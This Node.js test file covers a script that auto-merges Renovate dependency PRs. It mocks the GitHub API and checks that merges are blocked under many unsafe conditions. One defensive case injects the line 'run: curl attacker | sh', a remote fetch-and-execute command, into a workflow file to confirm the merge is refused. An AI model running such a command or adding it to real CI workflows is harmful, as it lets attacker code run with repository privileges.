import assert from 'node:assert/strict';
import test from 'node:test';
import { mergeForEvent } from './merge-dependencies.mjs';

const sha = 'a'.repeat(40);
const base = 'b'.repeat(40);
const repository = 'Codegenie-BE/laravel-env-guard';
const manifest = { require: { php: '^8.2', 'illuminate/support': '^12.0|^13.0' } };
const content = value => ({ encoding: 'base64', content: Buffer.from(JSON.stringify(value)).toString('base64') });
const goodStep = name => ({ name, conclusion: 'success' });
const goodJob = (name, steps) => ({ name, head_sha: sha, conclusion: 'success', steps: steps.map(goodStep) });

function fixture() {
    const pr = { number: 5, state: 'open', draft: false, user: { login: 'renovate[bot]', type: 'Bot' }, head: { sha, ref: 'renovate/ci-non-major', repo: { full_name: repository } }, base: { ref: 'main', repo: { full_name: repository } }, labels: [], mergeable: true, mergeable_state: 'clean', changed_files: 1 };
    const run = (id, path) => ({ id, workflow_id: id, head_sha: sha, path: `.github/workflows/${path}.yml`, head_branch: pr.head.ref, head_repository: { full_name: repository }, event: 'pull_request', status: 'completed', conclusion: 'success', run_attempt: 1 });
    const runs = { tests: run(10, 'tests'), distribution: run(20, 'distribution') };
    const jobs = [
        goodJob('CI plan', ['Determine required coverage']),
        goodJob('Dependency automation', ['Test dependency automation']),
        goodJob('Quality / Linux x64 / PHP 8.5 / Laravel 13', ['Install dependencies', 'Run fast quality gate']),
        ...[['8.2', '12'], ['8.3', '12'], ['8.4', '12'], ['8.5', '12'], ['8.3', '13'], ['8.4', '13'], ['8.5', '13']].map(([php, laravel]) => goodJob(`Compatibility / Linux x64 / PHP ${php} / Laravel ${laravel}`, ['Install dependencies', 'Run package tests'])),
        ...[['8.2', '12'], ['8.3', '13']].flatMap(([php, laravel]) => [
            goodJob(`Minimum dependencies / PHP ${php} / Laravel ${laravel}`, ['Install minimum supported dependencies', 'Validate minimum dependency runtime']),
            goodJob(`E2E / Linux x64 / PHP ${php} / Laravel ${laravel}`, ['Install package development dependencies', 'Run fresh Laravel application scenarios']),
        ]),
        ...['Windows x64', 'macOS ARM64', 'Linux ARM64'].map(platform => goodJob(`Portability / ${platform} / PHP 8.5 / Laravel 13`, ['Install dependencies', 'Run package tests'])),
        goodJob('Dependency review', ['Review dependency changes']),
        goodJob('Coverage / PHP 8.5 / Laravel 13', ['Install dependencies', 'Enforce coverage baseline']),
        goodJob('Proposed dependencies / manifest', ['Select proposed dependency range', 'Install proposed dependencies', 'Test proposed dependencies']),
        goodJob('CI gate', ['Verify every required job succeeded or was intentionally skipped']),
        goodJob('Required CI', ['Preserve the current ruleset check during migration']),
    ];
    const distributionJobs = [goodJob('Composer archive / PHP 8.5 / Laravel 13', ['Build Composer release archive', 'Validate release archive contents', 'Install archive into a fresh Laravel application'])];
    const state = { pr, runs, jobs, distributionJobs, reviews: [], threads: { totalCount: 0, nodes: [], pageInfo: { hasNextPage: false } }, statuses: { total_count: 1, statuses: [{ context: 'renovate/stability-days', state: 'success' }] }, files: [{ filename: '.github/workflows/tests.yml', status: 'modified' }], writes: [], mainReads: 0, before: 'uses: actions/checkout@' + 'c'.repeat(40) + ' # v7.0.1', after: 'uses: actions/checkout@' + 'd'.repeat(40) + ' # v7.0.2' };
    const api = async (path, options = {}) => {
        if (options.method === 'PUT') { state.writes.push({ path, ...options }); return { merged: true }; }
        if (path === '/git/ref/heads/main') { state.mainReads++; return { object: { sha: state.moved && state.mainReads > 1 ? 'e'.repeat(40) : base } }; }
        // GitHub's associated-PR list omits detail-only fields such as changed_files.
        if (path === `/commits/${sha}/pulls?per_page=100`) {
            const candidate = structuredClone(state.pr);
            delete candidate.changed_files;
            return [candidate];
        }
        if (path === '/pulls/5') return state.pr;
        if (path === '/pulls/5/files?per_page=100') return state.files;
        if (path === '/pulls/5/reviews?per_page=100') return state.reviews;
        if (path === '/graphql') return { data: { repository: { pullRequest: { reviewThreads: state.threads } } } };
        if (path === `/commits/${sha}/status?per_page=100`) return state.statuses;
        if (path === `/compare/${base}...${sha}`) return { ahead_by: 1, behind_by: state.behind ? 1 : 0 };
        if (path === '/rulesets/20992379') return { enforcement: state.unprotected ? 'disabled' : 'active', bypass_actors: [], conditions: { ref_name: { include: ['~DEFAULT_BRANCH'], exclude: [] } }, rules: [{ type: 'pull_request' }, { type: 'required_linear_history' }, { type: 'required_status_checks', parameters: { strict_required_status_checks_policy: true, required_status_checks: [{ context: 'CI gate', integration_id: 15368 }] } }] };
        if (path.startsWith('/contents/composer.json?ref=')) return content(manifest);
        if (path.startsWith('/contents/.github/workflows/tests.yml?ref=')) return { encoding: 'base64', content: Buffer.from(path.endsWith(base) ? state.before : state.after).toString('base64') };
        for (const workflow of ['tests', 'distribution']) {
            if (path.startsWith(`/actions/workflows/${workflow}.yml/runs?`)) {
                const list = [state.runs[workflow]];
                if (state.newer && workflow === 'tests') list.push({ ...state.runs.tests, id: 11, conclusion: 'failure' });
                if (state.missing && workflow === 'distribution') list.length = 0;
                return { total_count: list.length, workflow_runs: list };
            }
            if (path === `/actions/runs/${state.runs[workflow].id}/attempts/1/jobs?per_page=100`) {
                const list = workflow === 'tests' ? state.jobs : state.distributionJobs;
                return { total_count: list.length, jobs: list };
            }
        }
        throw new Error(`Unexpected API: ${path}`);
    };
    return { state, run: () => mergeForEvent({ api, repository, event: { state: 'success', context: 'renovate/stability-days', sha }, log: () => {} }) };
}

test('merges a dependency-only PR with exact tested SHA using protected squash API', async () => {
    const { state, run } = fixture();
    await run();
    assert.deepEqual(state.writes, [{ path: '/pulls/5/merge', method: 'PUT', body: { sha, merge_method: 'squash' } }]);
});

for (const [name, mutate] of [
    ['stale head', s => { s.pr.head.sha = 'f'.repeat(40); }],
    ['missing Distribution', s => { s.missing = true; }],
    ['newer failed CI', s => { s.newer = true; }],
    ['failed compatibility matrix', s => { s.jobs[3].conclusion = 'failure'; }],
    ['missing compatibility job', s => { s.jobs.splice(3, 1); }],
    ['skipped coverage', s => { s.jobs.find(j => j.name.startsWith('Coverage')).steps[1].conclusion = 'skipped'; }],
    ['pending Renovate status', s => { s.statuses.statuses[0].state = 'pending'; }],
    ['truncated status list', s => { s.statuses.total_count = 2; }],
    ['workflow logic changes', s => { s.after += '\nrun: curl attacker | sh'; }],
    ['main moved during verification', s => { s.moved = true; }],
    ['branch behind main', s => { s.behind = true; }],
    ['fork PR', s => { s.pr.head.repo.full_name = 'other/repo'; }],
    ['human author', s => { s.pr.user = { login: 'renovate[bot]', type: 'User' }; }],
    ['draft', s => { s.pr.draft = true; }],
    ['hold label', s => { s.pr.labels = [{ name: 'hold' }]; }],
    ['requested changes', s => { s.reviews = [{ user: { login: 'reviewer' }, state: 'CHANGES_REQUESTED' }]; }],
    ['unresolved conversation', s => { s.threads = { totalCount: 1, nodes: [{ isResolved: false }], pageInfo: { hasNextPage: false } }; }],
    ['incomplete review conversations', s => { s.threads.pageInfo.hasNextPage = true; }],
    ['disabled strict branch protection', s => { s.unprotected = true; }],
    ['blocked mergeability', s => { s.pr.mergeable_state = 'blocked'; }],
    ['failed Distribution', s => { s.runs.distribution.conclusion = 'failure'; }],
    ['skipped proposed dependency tests', s => { s.jobs.find(j => j.name.startsWith('Proposed')).conclusion = 'skipped'; }],
]) test(`never merges with ${name}`, async () => {
    const { state, run } = fixture();
    mutate(state);
    await run().catch(() => {});
    assert.deepEqual(state.writes, []);
});

test('a later approval supersedes the same reviewers requested changes', async () => {
    const { state, run } = fixture();
    state.reviews = [{ user: { login: 'reviewer' }, state: 'CHANGES_REQUESTED' }, { user: { login: 'reviewer' }, state: 'APPROVED' }];
    await run();
    assert.equal(state.writes.length, 1);
});
